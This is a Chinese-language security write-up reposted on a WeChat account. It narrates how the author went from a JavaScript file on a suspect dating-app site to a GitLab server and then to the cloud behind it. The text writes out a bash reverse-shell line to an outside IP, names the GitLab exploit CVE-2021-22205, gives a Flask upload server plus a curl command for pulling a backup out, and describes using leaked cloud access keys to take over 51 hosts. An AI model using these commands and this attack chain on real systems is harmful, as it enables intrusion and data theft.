#  记一次hc中因为JS拿下整个云

1201463046740633  [ Z2O安全攻防 ](javascript:void\(0\);)

**Z2O安全攻防** ![]()

微信号 Z2O_SEC

功能介绍 From zero to one

____

___发表于_

收录于合集

点击上方[蓝字]，关注我们

 **建议大家把公众号“Z2O安全攻防”设为星标，否则可能就看不到啦！**
因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。

![]()

# 免责声明

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。

# 文章正文

# 0x00 前言

本次分享主要是分享一次HC中的思路，值得大家学习，服务器已经交给相关部门进行取证等也已经打包结A了

# 0x01 信息收集

首先给到一个资产是二维码，是一张sese图片里面带有约炮的app下载，扫码后得到如下结果

![]()

得到如下结果  
https://www.target.com[1]  
后进行访问主站

注册成功后发现全是妹子(........),这个时候先别急，咱第一步先去看他调用的JS资源  
随便点击一个资源然后刷新一下看他F12网络

这里首先我只能用当时留下的毫无关联的图片进行演示了，当时我看到的JS文件叫 "MyProfile"

![]()

# 0x02 JS断点调试

这个凭借个人感觉就是个关键信息(我的资料 - > 配置信息？)，

所以凭借这些理由，我在XHR中锁定了"MyProfile"这个关键字进行JS断点

![]()

然后刷新进行调试 在漫长的调试过程中我发现在一个很奇怪的JS文件中调用了我的MyProfile字段 叫/assets/index-xxxxxx.js

一般来说我就会去审计一下这个JS文件 结果发现好东西了

![]()

    
    
    bindgen: "git+http://123.123.123.123:1111/target2/a.git#0.0.14"

# 0x03 新突破

我当时就立刻去访问了一下 发现竟然是一个gitlab!

![]()

  
找了一下历史漏洞 直接 CVE-2021-22205 直接梭哈 成功拿到shell

![]()

由于是执行命令，所以写了shell反弹

    
    
    echo 'bash -i >& /dev/tcp/123.123.123.123/1111 0>&1' > /tmp/haha.sh  
    chmod +x /tmp/haha.sh  
    /bin/bash /tmp/haha.sh

成功反弹shell

![]()

发现是ubunto的16.04
但是本地提权失败，找了SUID也没有办法，想尽了各种办法都没办法提权，打算放弃了，所以接下来就是去寻找Git权限能做的操作，找了一个下午，最终找到了backups目录里下找到了一个backup的tar包，应该八成就是gitlab上的备份了

![]()

# Flask之取文件

但是问题来了，我怎么做到在我反弹shell中把文件拖出来了呢？scp等都试过了不行，于是乎我就写了个flask的上传页面让shell去curl一下把文件post上来(感觉这思路骚的)

我的服务器

    
    
    from flask import Flask,request  
    import os  
      
    app = Flask(__name__)  
      
    @app.route('/upload',methods=['POST'])  
    def upload_file():  
        file = request.files.get('file')  
        if file :  
            filename = file.filename  
            file.save(os.path.join(os.getcwd(),filename))  
            return f"File {filename} saved successfully"  
        else:  
            return "worry"  
      
      
    if  __name__ == '__main__':  
        app.run(host='0.0.0.0',debug=True,port=5000)

受控主机shell

    
    
    curl -X POST http://123.123.123.123:1111/upload -F file=@./a.gitlab_backup.tar

# 0x04 云沦陷(泄露AK SK)

几个G，下载漫长的很呢

然后拖到本地后应该就是gitlab的备份了，(因为他备份文件名字中带有gitlab的版本号)要用到对应的gitlab的相应版本去搭建，然后本地搭建导入备份后慢慢的寻找一些有用信息，后面突然发现一个叫application.yaml的文件
进行审计后泄露了ak和sk(这开发倒是备份挺明白的全部都写清清楚楚)

![]()

  
这个时候行云管家一把梭哈，因为权限很大，接管整个云了，总共是51台主机都拿下了

# 0x05 总结

思路就是 ：打点 -> JS文件断点调试 ->新突破上shell-> 解决困难-> 发现新大陆(本地搭建)->
接管云，最后全部打包好给了JF，也进行取证立A了，到此因为一个JS文件拿下整个云结束了，思路可以学习一波。

  *   * 

    
    
    文章来源：https://xz.aliyun.com/t/12698如有侵权，联系删除。

# 技术交流

### 知识星球

致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。专题更新奇技淫巧小Tips及实战案例。

涉及方向包括Web渗透、免杀绕过、内网攻防、代码审计、应急响应、云安全。星球中已发布 300+
安全资源，针对网络安全成员的普遍水平，并为星友提供了教程、工具、POC&EXP以及各种学习笔记等等。([点我了解详情](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247496923&idx=1&sn=523f413df2d53de64fd48fbb081be790&chksm=ceab1f9bf9dc968da974eec5e34003d8a937884d2732fda7fac190360fd2a1a5290db090d8e9&scene=21#wechat_redirect))

![]()

### 学习圈子

一个引导大家一起成长，系统化学习的圈子。如果看到这里的师傅是基础不够扎实/技术不够全面/入行安全不久/有充足时间的初学者...其中之一，那么欢迎加入我们的圈子。在圈子内会每周规划学习任务，提供资料、技术文档，供大家一起学习、交流，由浅入深、层层递进。（[点我了解详情](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247498684&idx=1&sn=71c923f29d6431f6271398d435f96ae0&chksm=ceab10fcf9dc99ea174325e6982af84d0331aeee2cb0196ac11405acd44283c18da31e77d553&scene=21#wechat_redirect)）

![]()

 ****

### 交流群

关注公众号回复“ **加群** ”，添加Z2OBot好友，自动拉你加入 **Z2O安全攻防交流群(微信群)** 分享更多好东西。
**（QQ群可直接扫码添加）**

![]()

![]()

### 关注我们

 **关注福利：**

 **回复“** **app** **" 获取   app渗透和app抓包教程**

 **回复“** **渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

 **回复“** **书籍** **"  获取 网络安全相关经典书籍电子版pdf**

 ** **回复“ 资料** **"  获取 网络安全、渗透测试相关资料文档****

 ** **  
****

点个【 在看 】，你最好看

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

